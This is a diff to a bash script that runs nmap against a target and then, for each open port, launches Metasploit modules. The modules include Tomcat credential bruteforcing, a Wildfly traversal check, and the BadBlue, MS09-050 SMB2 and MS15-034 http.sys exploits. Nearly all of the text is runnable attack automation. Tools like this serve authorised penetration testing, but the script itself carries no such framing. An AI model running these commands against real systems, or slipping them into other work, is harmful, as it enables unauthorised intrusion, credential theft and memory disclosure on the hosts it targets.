@@ -1,5 +1,5 @@
-nmap -p445,8080,80,16992,3306,135,5900,21,22,139,3389,443 -sS -v --open "$1" > $(pwd)/nmap-$1.txt 
-THREADS="10"
+nmap -p445,8080,80,16992,3306,135,137,111,5900,21,22,139,3389,443 -sS -v --open "$1" > $(pwd)/nmap-$1.txt 
+THREADS="30"
 	if [[ $(cat $(pwd)/nmap-$1.txt | grep 8080 ) = *open* ]]; then 
 	echo [+]"Bruteforcing Tomcat /manager/html"
 	msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; setg RHOSTS \"$1\"; setg USER_FILE "$(pwd)/Dict/user.txt"; setg PASS_FILE "$(pwd)/Dict/pass.txt"; run; exit;"
@@ -10,9 +10,34 @@ THREADS="10"
 	msfconsole -q -x "use auxiliary/scanner/http/jboss_status; setg RHOSTS \"$1\"; run; back;exit;"
 	fi
 
+	if [[ $(cat $(pwd)/nmap-$1.txt | grep 8080 ) = *open* ]]; then
+	echo -e [+]"Checking for Wildfly"
+	msfconsole -q -x "use auxiliary/scanner/http/wildfly_traversal; setg RHOSTS \"$1\"; run; back;exit;"
+	fi
+
+	if [[ $(cat $(pwd)/nmap-$1.txt | grep 137 ) = *open* ]]; then
+	echo -e [+]"Checking for NBNAME"
+	msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS \"$1\"; run; back;exit;"
+	fi
+
+	if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
+	echo -e [+]"Checking SMB Version"
+	msfconsole -q -x "use auxiliary/scanner/smb/smb_version; setg RHOSTS \"$1\"; run; back;exit;"
+	fi
+
+	if [[ $(cat $(pwd)/nmap-$1.txt | grep 111 ) = *open* ]]; then
+	echo -e [+]"Checking of NFS"
+	msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS \"$1\"; run; back;exit;"
+	fi
+
 	if [[ $(cat $(pwd)/nmap-$1.txt | grep 22 ) = *open* ]]; then
 	echo -e [+]"Checking for SSH version"
 	msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version; setg RHOSTS \"$1\"; run; back;exit;"
+	fi
+
+	if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
+	echo -e [+]"Checking for BadBlue"
+	msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$1\"; run; back;exit;"
 	fi
 
 	if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
@@ -133,7 +158,17 @@ echo "Do you want to run WMAP? y/n"
 
 		if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
 			echo [+]"Trying MS09_050 Ngotiate Func"
-			msfconsole -q -x "use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; setg RHOST \"$1\";set WAIT 2;exploit; back;exit;"
+			msfconsole -q -x "use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; setg RHOST \"$1\";exploit; back;exit;"
+		fi
+
+		if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
+			echo [+]"Checking for HTTP Methods"
+			msfconsole -q -x "use auxiliary/scanner/http/options; setg RHOSTS \"$1\";exploit; back;exit;"
+		fi
+
+		if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
+			echo [+]"Checking for HTTP Memory Dump"
+			msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$1\";set WAIT 2;exploit; back;exit;"
 		fi
 
 		if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
